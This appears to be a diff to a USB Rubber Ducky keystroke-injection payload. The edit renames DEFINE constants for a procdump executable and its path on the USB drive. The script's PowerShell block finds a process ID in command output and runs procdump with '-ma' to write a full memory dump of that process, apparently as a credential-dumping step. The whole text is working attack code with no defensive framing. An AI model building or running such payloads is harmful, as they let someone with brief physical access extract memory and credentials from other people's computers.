@@ -14,14 +14,13 @@ REM     - Authorization to execute powershell commands
 
 
 REM You must change it to 'procdump' if you want to use procdump.exe instead of procdump64a.exe
-DEFINE $WHAT_EXE_DO_YOU_WANT_TO_USE procdump64a
+DEFINE #WHAT_EXE_DO_YOU_WANT_TO_USE procdump64a
 
 REM Path to the EXE file stored in the usb, i.e. if 'F:\ProcDump\Procdump\procdump.exe' you must use '\ProcDump\Procdump\'
-DEFINE $PATH_TO_EXE \ProcDump\Procdump\
+DEFINE #PATH_TO_EXE \ProcDump\Procdump\
 
 REM Driver Label of your RubberDucky - Default: DUCKY
 DEFINE #DUCKY_DRIVE_LABEL DUCKY
-
 
 EXTENSION DETECT_READY
     REM VERSION 1.1
@@ -66,7 +65,7 @@ STRINGLN_POWERSHELL
     foreach ($i in $a){
         if ( $i -like '*PID*'){
             $i -match 'PID.\s+(.+)';
-            ".$PATH_TO_EXE$WHAT_EXE_DO_YOU_WANT_TO_USE.exe" -ma $matches[1];
+            ".#PATH_TO_EXE#WHAT_EXE_DO_YOU_WANT_TO_USE.exe" -ma $matches[1];
         }
     }
     exit;
